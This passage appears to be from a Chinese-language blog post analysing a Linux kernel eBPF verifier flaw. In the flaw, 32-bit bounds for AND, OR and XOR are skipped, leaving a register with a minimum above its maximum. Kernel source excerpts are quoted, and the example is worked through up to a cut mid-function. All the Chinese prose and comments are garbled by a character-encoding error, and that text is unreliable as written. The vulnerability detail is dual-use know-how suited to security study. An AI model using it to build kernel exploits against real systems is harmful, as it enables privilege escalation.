<code>do_check()</code>ï¼Œè¯¥å‡½æ•°ä¼šéå†æ¯ä¸€æ¡æŒ‡ä»¤å¹¶æ ¹æ®æŒ‡ä»¤çš„ä¸åŒç±»å‹è¿›è¡Œä¸åŒæ“ä½œï¼Œå¯¹äºç®—æœ¯æŒ‡ä»¤ï¼ˆ<code>BPF_ALU</code> &#x2F; <code>BPF_ALU64</code>ï¼‰è€Œè¨€æœ‰å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">do_check</span>()<span class="hljs-comment">// éå†æ¯ä¸€æ¡æŒ‡ä»¤å¹¶æ ¹æ®ç±»å‹è°ƒç”¨ç›¸åº”å‡½æ•°å¤„ç†</span><br><span class="hljs-built_in">check_alu_op</span>()<span class="hljs-comment">// æ ¹æ®ç®—æœ¯æŒ‡ä»¤çš„ opcode è¿›è¡Œä¸åŒå¤„ç†</span><br><span class="hljs-built_in">adjust_reg_min_max_vals</span>()<span class="hljs-comment">// è®¡ç®—æ–°çš„å¯„å­˜å™¨è¾¹ç•Œå€¼</span><br><span class="hljs-built_in">adjust_scalar_min_max_vals</span>()<span class="hljs-comment">// æ ¹æ® opcode è®¡ç®—å…·ä½“çš„æ–°è¾¹ç•Œå€¼</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>adjust_scalar_min_max_vals()</code> å‡½æ•°å½“ä¸­ä¼šå¯¹ 32 ä½ä¸ 64 ä½éƒ½è¿›è¡Œè¾¹ç•Œæ ¡éªŒï¼ˆå› ä¸ºå®é™…å‚ä¸è¿ç®—çš„å¯èƒ½æ˜¯ 32 ä¹Ÿå¯èƒ½æ˜¯ 64ï¼‰ï¼Œè®¡ç®—è¾¹ç•Œå€¼çš„é€»è¾‘ä¸»è¦æ˜¯å…ˆè°ƒç”¨ <code>scalar32_min_max_xor()</code> è®¡ç®— 32 ä½è¾¹ç•Œå€¼å†è°ƒç”¨ <code>scalar_min_max_xor()</code> è®¡ç®— 64 ä½è¾¹ç•Œå€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* WARNING: è¯¥å‡½æ•°åœ¨ 64 ä½å€¼ä¸Šè¿›è¡Œè®¡ç®—ï¼Œä½†å®é™…æ‰§è¡Œå¯èƒ½åœ¨ 32 ä½å€¼ä¸Šï¼Œ</span><br><span class="hljs-comment"> * å› æ­¤åœ¨ 32 ä½çš„æƒ…å†µä¸‹ï¼Œè¯¸å¦‚ä½ç§»ç­‰éœ€è¦é¢å¤–çš„æ£€æŸ¥.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_scalar_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_insn *insn,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_reg_state src_reg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">switch</span> (opcode) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_AND:<br>dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_and(dst_reg, &amp;src_reg);<span class="hljs-comment">/* æ¼æ´ç‚¹ */</span><br>scalar_min_max_and(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> BPF_OR:<br>dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_or(dst_reg, &amp;src_reg);<span class="hljs-comment">/* æ¼æ´ç‚¹ */</span><br>scalar_min_max_or(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> BPF_XOR:<br>dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_xor(dst_reg, &amp;src_reg);<span class="hljs-comment">/* æ¼æ´ç‚¹ */</span><br>scalar_min_max_xor(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* ALU32 ops are zero extended into 64bit register */</span><br><span class="hljs-keyword">if</span> (alu32)<br>zext_32_to_64(dst_reg);<br><br>__update_reg_bounds(dst_reg);<span class="hljs-comment">//æ›´æ–°è¾¹ç•Œ</span><br>__reg_deduce_bounds(dst_reg);<br>__reg_bound_offset(dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨æ›´æ–° 32 ä½è¾¹ç•Œå€¼æ—¶å¼€å‘è€…è®¤ä¸ºå¦‚æœä¸¤ä¸ªå¯„å­˜å™¨çš„ä½ 32 ä½éƒ½ä¸º <code>known</code> é‚£å°±å¯ä»¥<strong>ç›´æ¥è·³è¿‡</strong>ï¼Œå› ä¸º 64 ä½æ—¶è¿˜ä¼šè¿›è¡Œæ›´æ–°ï¼š</p><blockquote><p><code>tnum_subreg_is_const()</code> ä¼šçœ‹å¯„å­˜å™¨çš„ <code>var_off</code> çš„ mask çš„ä½ 32 ä½æ˜¯å¦ä¸º 0ï¼ˆå³å…¨éƒ¨å·²çŸ¥ï¼‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar32_min_max_and</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br><span class="hljs-type">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);<br><span class="hljs-type">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);<br>s32 smin_val = src_reg-&gt;s32_min_value;<br>u32 umax_val = src_reg-&gt;u32_max_value;<br><br><span class="hljs-comment">/* å‡è®¾ scalar64_min_max_and å°†è¢«è°ƒç”¨ï¼Œ</span><br><span class="hljs-comment"> * å› æ­¤è·³è¿‡ä¸ºå·²çŸ¥çš„ 32ä½æƒ…å†µæ›´æ–°å¯„å­˜å™¨æ˜¯å®‰å…¨çš„.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known)<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>åœ¨æ›´æ–° 64 ä½è¾¹ç•Œå€¼æ—¶è‹¥ä¸¤ä¸ªå¯„å­˜å™¨éƒ½ä¸º <code>known</code> å°±ç›´æ¥è°ƒç”¨ <code>__mark_reg_known()</code> <strong>å°†å¯„å­˜å™¨æ ‡ä¸º</strong> <code>known</code> <strong>å¹¶ç›´æ¥è¿”å›</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar_min_max_and</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br><span class="hljs-type">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);<br><span class="hljs-type">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);<br>s64 smin_val = src_reg-&gt;smin_value;<br>u64 umax_val = src_reg-&gt;umax_value;<br><br><span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known) &#123;<br>__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p><code>__mark_reg_known()</code> å…¶å®å°±æ˜¯ç®€å•çš„è°ƒç”¨ <code>tnum_const()</code> è®¾ç½®å¯„å­˜å™¨ <code>var_off</code> ä¸º <code>known</code> ï¼Œå¹¶ç»™å¯¹åº”è¾¹ç•Œèµ‹å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This helper doesn&#x27;t clear reg-&gt;id */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> ___mark_reg_known(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u64 imm)<br>&#123;<br>reg-&gt;var_off = tnum_const(imm);<br>reg-&gt;smin_value = (s64)imm;<br>reg-&gt;smax_value = (s64)imm;<br>reg-&gt;umin_value = imm;<br>reg-&gt;umax_value = imm;<br><br>reg-&gt;s32_min_value = (s32)imm;<br>reg-&gt;s32_max_value = (s32)imm;<br>reg-&gt;u32_min_value = (u32)imm;<br>reg-&gt;u32_max_value = (u32)imm;<br>&#125;<br><br><span class="hljs-comment">/* æ ‡è®°ä¸€ä¸ªå¯„å­˜å™¨çš„æœªçŸ¥éƒ¨åˆ† (å˜é‡åç§»æˆ–æ ‡é‡å€¼) </span><br><span class="hljs-comment"> * ä¸ºå·²çŸ¥çš„å€¼ @imm.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __mark_reg_known(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u64 imm)<br>&#123;<br><span class="hljs-comment">/* Clear id, off, and union(map_ptr, range) */</span><br><span class="hljs-built_in">memset</span>(((u8 *)reg) + <span class="hljs-keyword">sizeof</span>(reg-&gt;type), <span class="hljs-number">0</span>,<br>       offsetof(<span class="hljs-keyword">struct</span> bpf_reg_state, var_off) - <span class="hljs-keyword">sizeof</span>(reg-&gt;type));<br>___mark_reg_known(reg, imm);<br>&#125;<br><br></code></pre></td></tr></table></figure></blockquote><p>ä½†è¿™æ ·å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œ<strong>è‹¥å­˜åœ¨ä¸€ä¸ªé«˜ 32 ä½ unknown çš„å¯„å­˜å™¨ï¼Œåˆ™ä¸ä¼šè°ƒç”¨</strong> <code>__mark_reg_known()</code> <strong>æ›´æ–° 32 ä½çš„è¾¹ç•Œå€¼ï¼Œè€Œåªä¼šæ›´æ–° 64 ä½è¾¹ç•Œå€¼</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* æˆ‘ä»¬ä» var_off ä¸­è·å–æœ€å°å€¼, å› ä¸ºå…¶æœ¬è´¨ä¸Šæ˜¯æŒ‰ä½çš„.</span><br><span class="hljs-comment"> * æˆ‘ä»¬çš„æœ€å¤§å€¼ä¸ºæ“ä½œæ•°ä¸­æ‰€æœ‰æœ€å¤§å€¼çš„æœ€å°å€¼.</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;<br>dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);<br><span class="hljs-keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="hljs-number">0</span> || smin_val &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* åœ¨åŠ ä¸Šè´Ÿå€¼æ—¶ä¼šä¸¢å¤±æœ‰ç¬¦å·çš„èŒƒå›´ï¼Œ</span><br><span class="hljs-comment"> * æ²¡äººæœ‰æ—¶é—´æè¿™ä¸ª.  // è¯‘æ³¨ï¼šåŸæ–‡å¦‚æ­¤</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;smin_value = S64_MIN;<br>dst_reg-&gt;smax_value = S64_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* ä¸¤ä¸ªæ­£å€¼åšä¸è¿˜æ˜¯æ­£å€¼, </span><br><span class="hljs-comment"> * æ•…å¯ä»¥å¾ˆå®‰å…¨åœ°å°†ç»“æœè½¬ä¸º s64.</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;<br>dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;<br>&#125;<br><span class="hljs-comment">/* æˆ‘ä»¬å¯èƒ½ä» var_off ä¸­è·å–åˆ°æ›´å¤š */</span><br>__update_reg_bounds(dst_reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç¬”è€…ä¸¾ä¸€ä¸ªéå¸¸ç®€å•çš„<del>å¹¶ä¸”å·²ç»åœ¨å…¶ä»–å„å¤§å¸ˆå‚…çš„æ¼æ´åˆ†æçš„æ–‡ç« é‡Œç”¨çƒ‚äº†çš„</del>ä¾‹å­ï¼š</p><ul><li><code>R2 = &#123; .value = 0x1, .mask = 0xffffffff00000000 &#125;;</code> ï¼šè¯¥å¯„å­˜å™¨ä½ 32 ä½å€¼å·²çŸ¥ä¸º 1ï¼Œé«˜ 32 ä½ä¸ç¡®å®š</li><li><code>R3 = &#123; .value = 0x100000002, .mask = 0x0 &#125;;</code> ï¼šè¯¥å¯„å­˜å™¨ 64 ä½å€¼å…¨éƒ¨å·²çŸ¥ï¼Œä¸º <code>0x100000002</code></li></ul><p>å‡å¦‚æˆ‘ä»¬å°† R2 ä¸ R3 åšä¸è¿ç®—ï¼Œåœ¨åˆšè¿›å…¥ switch æ—¶ä¼šå…ˆè°ƒç”¨ <code>tnum_and()</code> è¿›è¡Œè®¡ç®—å¹¶å°†ç»“æ„ä¿å­˜åˆ° <code>R2-&gt;var_off</code>ï¼Œç”±äº R3 å…¨éƒ¨ç¡®å®šè€Œ R2 çš„é«˜ 32 ä½ä¸ç¡®å®šï¼Œå› æ­¤è¿ç®—ç»“æœä¸º <code>&#123; .value = 0x0, .mask = 0x100000000 &#125;</code>ï¼Œå³ä»…æœ‰ç¬¬ 32 ä½æ˜¯ä¸ç¡®å®šçš„</p><p>æ¥ä¸‹æ¥ç»§ç»­å›åˆ° <code>scalar_min_max_and()</code>ä¸­ï¼Œè¯¥å‡½æ•°æœ€åä¼šè°ƒç”¨ <code>__update_reg_bounds()</code> å¯¹æ¯”å¯„å­˜å™¨çš„ <code>var_off</code> å¹¶æ›´æ–°è¾¹ç•Œå€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg32_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);<br><br><span class="hljs-comment">/* min signed is max(sign bit) | min(other bits) */</span><br>reg-&gt;s32_min_value = <span class="hljs-type">max_t</span>(s32, reg-&gt;s32_min_value,<br>var32_off.value | (var32_off.mask &amp; S32_MIN));<br><span class="hljs-comment">/* max signed is min(sign bit) | max(other bits) */</span><br>reg-&gt;s32_max_value = <span class="hljs-type">min_t</span>(s32, reg-&gt;s32_max_value,<br>var32_off.value | (var32_off.mask &amp; S32_MAX));<br>reg-&gt;u32_min_value = <span class="hljs-type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);<br>reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,<br> (u32)(var32_off.value | var32_off.mask));<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg64_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* min signed is max(sign bit) | min(other bits) */</span><br>reg-&gt;smin_value = <span class="hljs-type">max_t</span>(s64, reg-&gt;smin_value,<br>reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));<br><span class="hljs-comment">/* max signed is min(sign bit) | max(other bits) */</span><br>reg-&gt;smax_value = <span class="hljs-type">min_t</span>(s64, reg-&gt;smax_value,<br>reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));<br>reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);<br>reg-&gt;umax_value = min(reg-&gt;umax_value,<br>      reg-&gt;var_off.value | reg-&gt;var_off.mask);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br>__update_reg32_bounds(reg);<br>__update_reg64_bounds(reg);<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š</p><ul><li>æœ€å°è¾¹ç•Œå€¼ &#x3D; ã€<code>min_value</code> ã€ <code>var_off</code> å·²çŸ¥å€¼ã€‘ä¸­çš„æœ€å¤§è€…</li><li>æœ€å¤§è¾¹ç•Œå€¼ &#x3D;ã€ <code>max_value</code> ã€ <code>var_off</code> å·²çŸ¥å€¼ã€‘ä¸­çš„æœ€å°è€…</li></ul><p>ç”±äº R2 çš„ 32 ä½åˆå§‹è¾¹ç•Œå€¼æœªç»è¿‡æ›´æ–°ï¼Œä»ä¸ºå…¶åŸå€¼ <code>1</code>ï¼Œå› æ­¤ç»è¿‡è¯¥è½®è®¡ç®—ä¹‹å R2 çš„<strong>æœ€å°å€¼ä¸º 1ï¼Œæœ€å¤§å€¼ä¸º 0</strong>ï¼Œè€Œè¿™æ˜¾ç„¶æ˜¯ä¸åˆç†çš„</p><p>å›åˆ°  <code>adjust_scalar_min_max_vals()</code> ä¸­ï¼Œå…¶æœ€åä¹Ÿä¼šè°ƒç”¨ <code>__update_reg_bounds()</code> å¯¹æ¯”å¯„å­˜å™¨çš„ <code>var_off</code> å¹¶æ›´æ–°è¾¹ç•Œå€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">default</span>:<br>mark_reg_unknown(env, regs, insn-&gt;dst_reg);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* ALU32 ops are zero extended into 64bit register */</span><br><span class="hljs-keyword">if</span> (alu32)<br>zext_32_to_64(dst_reg);<br><br>__update_reg_bounds(dst_reg);<br>__reg_deduce_bounds(dst_reg);<br>__reg_bound_offset(dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__reg_deduce_bounds()</code> ä¸»è¦å†åšä¸€æ¬¡è¾¹ç•Œè°ƒæ•´æ ¡éªŒçš„å·¥ä½œï¼Œè¿™é‡Œ 32 ä½ä¸ 64 ä½éƒ½ç”¨çš„åŒä¸€å¥—é€»è¾‘ï¼š</p><ul><li>è‹¥æœ‰ç¬¦å·æœ€å°å€¼è¾¹ç•Œå¤§äºç­‰äº 0 æˆ– æœ‰ç¬¦å·æœ€å¤§å€¼è¾¹ç•Œå°äº 0 ï¼Œåˆ™æ›´æ–°æœ‰ç¬¦å·æœ€å°å€¼è¾¹ç•Œä¸ºæœ‰ç¬¦å·ä¸æ— ç¬¦å·æœ€å°å€¼è¾¹ç•Œä¸­çš„æœ€å¤§å€¼ï¼Œå¹¶æ›´æ–°æœ‰ç¬¦å·æœ€å¤§å€¼è¾¹ç•Œä¸ºæœ‰ç¬¦å·ä¸æ— ç¬¦å·æœ€å¤§å€¼è¾¹ç•Œä¸­çš„æœ€å°å€¼ï¼Œä¹‹åç›´æ¥è¿”å›</li><li>è‹¥æ— ç¬¦å·æœ€å¤§å€¼è¾¹ç•Œæ²¡æœ‰è¶…è¿‡æœ‰ç¬¦å·èŒƒå›´ï¼ˆæœ€é«˜ä½ä¸ä¸º1ï¼‰ï¼Œåˆ™å°†æœ‰ç¬¦å·æœ€å°å€¼è®¾ä¸ºæ— ç¬¦å·æœ€å°å€¼ï¼Œæœ‰ç¬¦å·æœ€å¤§å€¼è®¾ä¸ºæœ‰ç¬¦å·ä¸æ— ç¬¦å·æœ€å¤§å€¼ä¸­çš„æœ€å°å€¼</li><li>å¦åˆ™ï¼Œè‹¥æ— ç¬¦å·æœ€å°å€¼è¾¹ç•Œè¶…è¿‡æœ‰ç¬¦å·èŒƒå›´ï¼ˆæœ€é«˜ä½ä¸º1ï¼‰ï¼Œåˆ™å°†æœ‰ç¬¦å·æœ€å°å€¼è®¾ä¸ºæœ‰ç¬¦å·ä¸æ— ç¬¦å·æœ€å°å€¼ä¸­çš„æœ€å¤§å€¼ï¼Œå°†æœ‰ç¬¦å·æœ€å¤§å€¼è®¾ä¸ºæ— ç¬¦å·æœ€å¤§å€¼</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* ä½¿ç”¨æœ‰ç¬¦å·çš„æœ€å°/æœ€å¤§å€¼èµ‹å€¼æ— ç¬¦å·, åä¹‹äº¦ç„¶ */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg32_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* ä»æœ‰ç¬¦å·è¾¹ç•Œä¸­è·å–ç¬¦å·.</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬æ— æ³•ç©¿è¿‡ç¬¦å·è¾¹ç•Œï¼Œæœ‰ç¬¦å·ä¸æ— ç¬¦å·è¾¹ç•Œç›¸åŒï¼Œæ•…åˆå¹¶.</span><br><span class="hljs-comment"> * è¿™åœ¨è´Ÿæ•°æƒ…å†µä¸‹ä¹Ÿæœ‰ç”¨ï¼Œä¾‹å¦‚ï¼š</span><br><span class="hljs-comment"> * -3 s&lt;= x s&lt;= -1 æ„å‘³ç€ 0xf...fd u&lt;= x u&lt;= 0xf...ff.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (reg-&gt;s32_min_value &gt;= <span class="hljs-number">0</span> || reg-&gt;s32_max_value &lt; <span class="hljs-number">0</span>) &#123;<br>reg-&gt;s32_min_value = reg-&gt;u32_min_value =<br><span class="hljs-type">max_t</span>(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value =<br><span class="hljs-type">min_t</span>(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* ä»æ— ç¬¦å·è¾¹ç•Œä¸­è·å–è¾¹ç•Œ.  </span><br><span class="hljs-comment"> * æœ‰ç¬¦å·è¾¹ç•Œç©¿è¿‡äº†æœ‰ç¬¦å·èŒƒå›´ï¼Œæˆ‘ä»¬å¿…é¡»å°å¿ƒ.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((s32)reg-&gt;u32_max_value &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* æ­£æ•°. æˆ‘ä»¬æ— æ³•ä» smin è·å–ä»»ä½•ä¸œè¥¿, </span><br><span class="hljs-comment"> * ä½† smax æ˜¯æ­£æ•°ï¼Œå› æ­¤æ˜¯å®‰å…¨çš„.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;s32_min_value = reg-&gt;u32_min_value;<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value =<br><span class="hljs-type">min_t</span>(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((s32)reg-&gt;u32_min_value &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* è´Ÿæ•°.  æˆ‘ä»¬æ— æ³•ä» smax è·å–ä»»ä½•ä¸œè¥¿,</span><br><span class="hljs-comment"> * ä½† smin æ˜¯è´Ÿæ•°ï¼Œå› æ­¤æ˜¯å®‰å…¨çš„.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;s32_min_value = reg-&gt;u32_min_value =<br><span class="hljs-type">max_t</span>(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);<br>reg-&gt;s32_max_value = 